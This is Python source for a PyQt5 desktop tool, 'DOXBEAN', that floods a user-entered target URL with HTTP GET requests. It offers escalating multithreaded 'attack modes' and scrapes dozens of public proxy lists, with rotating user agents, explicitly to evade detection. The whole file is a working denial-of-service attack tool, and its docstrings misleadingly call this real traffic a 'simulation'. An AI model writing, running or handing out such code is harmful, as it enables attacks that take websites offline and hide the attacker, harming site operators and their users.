import sys
import requests
import random
import threading
from datetime import datetime
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel,
    QLineEdit, QPushButton, QTextEdit, QCheckBox, QSpacerItem,
    QSizePolicy, QComboBox, QProgressBar
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QPixmap, QIcon, QColor


COLOR_BACKGROUND = "#000000"
COLOR_FOREGROUND_MAIN_WINDOW = "#111111"
COLOR_LABELS_BORDERS = "#DDDDDD" # Changed from #333333 to a brighter color
COLOR_INPUT_BACKGROUND = "#111111"
COLOR_INPUT_TEXT = "#DDDDDD"
COLOR_LOG_TEXT = "#AAAAAA"
COLOR_BUTTON_BACKGROUND = "#333333"
COLOR_BUTTON_TEXT = "#DDDDDD"
COLOR_BUTTON_BORDER = "#111111"


COLOR_ERROR_BORDER = "#FF0000"


APP_IMAGE_URL = "https://l.top4top.io/p_3462agwc11.png"


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Mobile Safari/537.36"
]


def scrape_proxies():
    """
    """
    proxy_sources = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
        "https://raw.githubusercontent.com/hookzOF/ProxyScrape/master/http.txt",
        "https://raw.githubusercontent.com/Anorov/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
        "https://raw.githubusercontent.com/userxd001/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
        "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
"https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
"https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
"https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
"https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt",
"https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/http.txt",
"https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
"https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
"https://raw.githubusercontent.com/ProxySurf/ProxySurf/main/http.txt",
"https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt","https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
"https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt",
"https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks4.txt",
"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
"https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks4.txt",
"https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt"
    ]
    proxies = []
    for url in proxy_sources:
        try:

            response = requests.get(url, timeout=5)
            proxies.extend(response.text.strip().split('\n'))
        except requests.exceptions.RequestException:

            pass

    return list(set([p for p in proxies if p]))


class AttackThread(QThread):
    """

    """
    log_signal = pyqtSignal(str)
    update_progress = pyqtSignal(int)

    def __init__(self, url, num_requests, attack_mode, use_proxy):
        super().__init__()
        self.url = url
        self.num_requests = num_requests
        self.attack_mode = attack_mode
        self.use_proxy = use_proxy
        self.proxies = []
        self.running = True
        self.current_requests_sent = 0

    def run(self):
        """
        Main execution method for the thread. Simulates sending requests.
        """
        self.log_signal.emit(" DOXBEAN ACTIVATED! TARGET LOCKED! \n")
        if self.use_proxy:
            self.log_signal.emit(" Fetching proxies for evasion...")
            self.proxies = scrape_proxies()
            if self.proxies:
                self.log_signal.emit(f" Found {len(self.proxies)} proxies.")
            else:
                self.log_signal.emit(" No proxies found. Proceeding without proxy support.")

        for i in range(self.num_requests):
            if not self.running:
                break

            try:
                headers = {"User-Agent": random.choice(USER_AGENTS)}
                proxy = None
                if self.use_proxy and self.proxies:
                    proxy = {"http": random.choice(self.proxies)}


                if self.attack_mode == "Stealth":

                    requests.get(self.url, headers=headers, proxies=proxy, timeout=5)
                elif self.attack_mode == "Rage":

                    threading.Thread(target=requests.get, args=(self.url,), kwargs={"headers": headers, "proxies": proxy, "timeout": 3}).start()
                elif self.attack_mode == "Overkill":

                    for _ in range(5):
                        threading.Thread(target=requests.get, args=(self.url,), kwargs={"headers": headers, "proxies": proxy, "timeout": 2}).start()

                self.current_requests_sent += 1
                log_msg = f"[{datetime.now().strftime('%H:%M:%S')}]  ATTACK #{self.current_requests_sent}/{self.num_requests} (MODE: {self.attack_mode})"
                self.log_signal.emit(log_msg)
                self.update_progress.emit(int((self.current_requests_sent / self.num_requests) * 100))

            except requests.exceptions.RequestException as e:

                self.log_signal.emit(f"[ERROR] Request {self.current_requests_sent} failed: {str(e)}")
            except Exception as e:

                self.log_signal.emit(f"[FATAL ERROR] An unexpected error occurred: {str(e)}")


        if self.running:
            self.log_signal.emit("\n DOXBEAN FINISHED. TARGET ELIMINATED. ")
        self.update_progress.emit(0)

    def stop(self):
        """
        Sets the running flag to False to gracefully stop the thread.
        """
        self.running = False
        self.log_signal.emit("\n DOXBEAN HALTED BY USER.")


class MainWindow(QMainWindow):
    """
    The main application window for the DOXBEAN simulated DDoS tool.
    Provides an enhanced user interface with more visual feedback and controls.
    """
    def __init__(self):
        super().__init__()
        self.setWindowTitle("DOXBEAN by vantixt")
        self.setGeometry(200, 200, 700, 850)

        self.setStyleSheet(f"""
            QMainWindow {{
                background-color: {COLOR_BACKGROUND};
                color: {COLOR_FOREGROUND_MAIN_WINDOW};
                font-family: 'Courier New';
                font-weight: bold;
            }}
            QLabel {{
                color: {COLOR_LABELS_BORDERS};
                font-family: 'Courier New';
            }}
            QLineEdit, QComboBox, QTextEdit {{
                background-color: {COLOR_INPUT_BACKGROUND};
                color: {COLOR_INPUT_TEXT};
                border: 1px solid {COLOR_LABELS_BORDERS};
                padding: 5px;
                font-family: 'Courier New';
            }}
            QPushButton {{
                background-color: {COLOR_BUTTON_BACKGROUND};
                color: {COLOR_BUTTON_TEXT};
                font-weight: bold;
                border: 2px solid {COLOR_BUTTON_BORDER};
                padding: 5px 15px; /* Adjust padding to fit original aesthetic */
                border-radius: 0px; /* Original buttons had sharp corners */
            }}
            QPushButton:hover {{
                background-color: {COLOR_BUTTON_BORDER}; /* Slightly change on hover */
            }}
            QPushButton:pressed {{
                background-color: {COLOR_BACKGROUND}; /* Even darker on press */
            }}
            QPushButton:disabled {{
                background-color: {COLOR_INPUT_BACKGROUND};
                color: #555555;
                border: 1px solid {COLOR_LABELS_BORDERS};
            }}
            QCheckBox {{
                color: {COLOR_LABELS_BORDERS};
                font-family: 'Courier New';
            }}
            QProgressBar {{
                border: 1px solid {COLOR_LABELS_BORDERS};
                border-radius: 5px;
                text-align: center;
                background-color: {COLOR_INPUT_BACKGROUND};
                color: {COLOR_LOG_TEXT}; /* Text color for percentage */
            }}
            QProgressBar::chunk {{
                background-color: {COLOR_LABELS_BORDERS}; /* Fill color of the bar */
                border-radius: 5px;
            }}
        """)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout()


        title = QLabel("DOXBEAN")
        title.setAlignment(Qt.AlignCenter)

        title.setStyleSheet(f"font-size: 48px; color: {COLOR_LABELS_BORDERS};")
        layout.addWidget(title)


        self.image_label = QLabel()
        self.image_label.setAlignment(Qt.AlignCenter)
        self.image_label.setFixedSize(350, 350)
        layout.addWidget(self.image_label, alignment=Qt.AlignCenter)


        self.credit_label = QLabel("by vantixt")
        self.credit_label.setAlignment(Qt.AlignCenter)
        self.credit_label.setStyleSheet(f"color: {COLOR_LABELS_BORDERS}; font-size: 16px;")
        layout.addWidget(self.credit_label, alignment=Qt.AlignCenter)


        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet(f"""
            background-color: {COLOR_INPUT_BACKGROUND};
            color: {COLOR_LOG_TEXT};
            border: 2px solid {COLOR_LABELS_BORDERS};
        """)
        layout.addWidget(self.log_output)


        self.load_image_from_url(APP_IMAGE_URL)


        self.url_label = QLabel("TARGET URL:")
        self.url_label.setStyleSheet(f"color: {COLOR_LABELS_BORDERS};")
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("https://example.com")
        self.url_input.setStyleSheet(f"""
            background-color: {COLOR_INPUT_BACKGROUND};
            color: {COLOR_INPUT_TEXT};
            border: 1px solid {COLOR_LABELS_BORDERS};
        """)
        self.url_input.textChanged.connect(self.validate_url_input)
        layout.addWidget(self.url_label)
        layout.addWidget(self.url_input)


        self.requests_label = QLabel("NUMBER OF REQUESTS:")
        self.requests_label.setStyleSheet(f"color: {COLOR_LABELS_BORDERS};")
        self.requests_input = QLineEdit()
        self.requests_input.setPlaceholderText("10000")
        self.requests_input.setStyleSheet(f"""
            background-color: {COLOR_INPUT_BACKGROUND};
            color: {COLOR_INPUT_TEXT};
            border: 1px solid {COLOR_LABELS_BORDERS};
        """)
        self.requests_input.textChanged.connect(self.validate_requests_input)
        layout.addWidget(self.requests_label)
        layout.addWidget(self.requests_input)


        self.mode_label = QLabel("ATTACK MODE:")
        self.mode_label.setStyleSheet(f"color: {COLOR_LABELS_BORDERS};")
        self.mode_selector = QComboBox()
        self.mode_selector.addItems(["Stealth", "Rage", "Overkill"])
        self.mode_selector.setStyleSheet(f"""
            background-color: {COLOR_INPUT_BACKGROUND};
            color: {COLOR_INPUT_TEXT};
            border: 1px solid {COLOR_LABELS_BORDERS};
        """)
        layout.addWidget(self.mode_label)
        layout.addWidget(self.mode_selector)


        self.use_proxy = QCheckBox("AUTO-FETCH PROXIES (Evade Detection)")
        self.use_proxy.setStyleSheet(f"color: {COLOR_LABELS_BORDERS};")
        self.use_proxy.setChecked(True)
        layout.addWidget(self.use_proxy)


        self.progress_bar = QProgressBar()
        self.progress_bar.setValue(0)
        layout.addWidget(self.progress_bar)


        self.start_button = QPushButton("LAUNCH DOXBEAN")
        self.start_button.setStyleSheet(f"""
            background-color: {COLOR_BUTTON_BACKGROUND};
            color: {COLOR_BUTTON_TEXT};
            font-weight: bold;
            border: 2px solid {COLOR_BUTTON_BORDER};
            padding: 5px;
        """)
        self.start_button.clicked.connect(self.start_attack)
        layout.addWidget(self.start_button)

        self.stop_button = QPushButton("ABORT")
        self.stop_button.setStyleSheet(f"""
            background-color: {COLOR_INPUT_BACKGROUND};
            color: {COLOR_BUTTON_TEXT};
            border: 2px solid {COLOR_LABELS_BORDERS};
            padding: 5px;
        """)
        self.stop_button.setEnabled(False)
        self.stop_button.clicked.connect(self.stop_attack)
        layout.addWidget(self.stop_button)

        central_widget.setLayout(layout)

        self.attack_thread = None

    def load_image_from_url(self, url):
        """
        Loads an image from a given URL and sets it to the image_label.
        Includes a fallback to a solid black background if loading fails.
        """
        try:
            response = requests.get(url, timeout=10)
            pixmap = QPixmap()
            pixmap.loadFromData(response.content)

            if not pixmap.isNull():
                self.image_label.setPixmap(
                    pixmap.scaled(350, 350, Qt.KeepAspectRatio, Qt.SmoothTransformation)
                )
                self.log_message(" IMAGE LOADED! DOXBEAN IS READY!")
            else:
                self.log_message(" ERROR: Could not load image!")
                self._set_fallback_image()
        except requests.exceptions.RequestException as e:
            self.log_message(f" ERROR: Network issue loading image: {str(e)}. Using fallback.")
            self._set_fallback_image()
        except Exception as e:
            self.log_message(f" ERROR: Generic issue loading image: {str(e)}. Using fallback.")
            self._set_fallback_image()

    def _set_fallback_image(self):
        """Sets a solid black pixmap as a fallback image."""
        default_pixmap = QPixmap(350, 350)
        default_pixmap.fill(QColor(COLOR_INPUT_BACKGROUND))
        self.image_label.setPixmap(default_pixmap)

    def log_message(self, message):
        """
        Appends a message to the log output.
        (Reverted to original single-argument format)
        """
        self.log_output.append(message)
        self.log_output.ensureCursorVisible()

    def validate_url_input(self):
        """Changes border color of URL input based on valid URL format."""
        url = self.url_input.text().strip()
        if url.startswith("http://") or url.startswith("https://"):
            self.url_input.setStyleSheet(f"background-color: {COLOR_INPUT_BACKGROUND}; color: {COLOR_INPUT_TEXT}; border: 1px solid {COLOR_LABELS_BORDERS}; padding: 5px;")
        else:
            self.url_input.setStyleSheet(f"background-color: {COLOR_INPUT_BACKGROUND}; color: {COLOR_INPUT_TEXT}; border: 1px solid {COLOR_ERROR_BORDER}; padding: 5px;")

    def validate_requests_input(self):
        """Changes border color of requests input based on valid integer."""
        text = self.requests_input.text().strip()
        if text.isdigit() and int(text) > 0:
            self.requests_input.setStyleSheet(f"background-color: {COLOR_INPUT_BACKGROUND}; color: {COLOR_INPUT_TEXT}; border: 1px solid {COLOR_LABELS_BORDERS}; padding: 5px;")
        else:
            self.requests_input.setStyleSheet(f"background-color: {COLOR_INPUT_BACKGROUND}; color: {COLOR_INPUT_TEXT}; border: 1px solid {COLOR_ERROR_BORDER}; padding: 5px;")

    def start_attack(self):
        """
        Initiates the simulated attack thread after validating user inputs.
        Updates UI state to reflect ongoing simulation.
        """
        url = self.url_input.text().strip()
        num_requests_str = self.requests_input.text().strip()


        if not (url.startswith("http://") or url.startswith("https://")):
            self.log_message(" ENTER A VALID TARGET URL (e.g., https://example.com)!")
            self.url_input.setStyleSheet(f"background-color: {COLOR_INPUT_BACKGROUND}; color: {COLOR_INPUT_TEXT}; border: 2px solid {COLOR_ERROR_BORDER}; padding: 5px;")
            return

        if not num_requests_str.isdigit() or int(num_requests_str) <= 0:
            self.log_message(" INVALID REQUEST COUNT! Please enter a positive number.")
            self.requests_input.setStyleSheet(f"background-color: {COLOR_INPUT_BACKGROUND}; color: {COLOR_INPUT_TEXT}; border: 2px solid {COLOR_ERROR_BORDER}; padding: 5px;")
            return

        num_requests = int(num_requests_str)
        attack_mode = self.mode_selector.currentText()
        use_proxy = self.use_proxy.isChecked()


        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.url_input.setEnabled(False)
        self.requests_input.setEnabled(False)
        self.mode_selector.setEnabled(False)
        self.use_proxy.setEnabled(False)

        self.progress_bar.setValue(0)
        self.log_output.clear()
        self.log_message(" Launching DOXBEAN Simulation...")


        self.attack_thread = AttackThread(url, num_requests, attack_mode, use_proxy)
        self.attack_thread.log_signal.connect(self.log_message)
        self.attack_thread.update_progress.connect(self.progress_bar.setValue)
        self.attack_thread.start()

    def stop_attack(self):
        """
        Requests the attack thread to stop and updates the UI accordingly.
        """
        if self.attack_thread and self.attack_thread.isRunning():
            self.attack_thread.stop()
            self.attack_thread.wait()

        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)

        self.url_input.setEnabled(True)
        self.requests_input.setEnabled(True)
        self.mode_selector.setEnabled(True)
        self.use_proxy.setEnabled(True)
        self.progress_bar.setValue(0)
        self.log_message("DOXBEAN Simulation stopped.")



if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
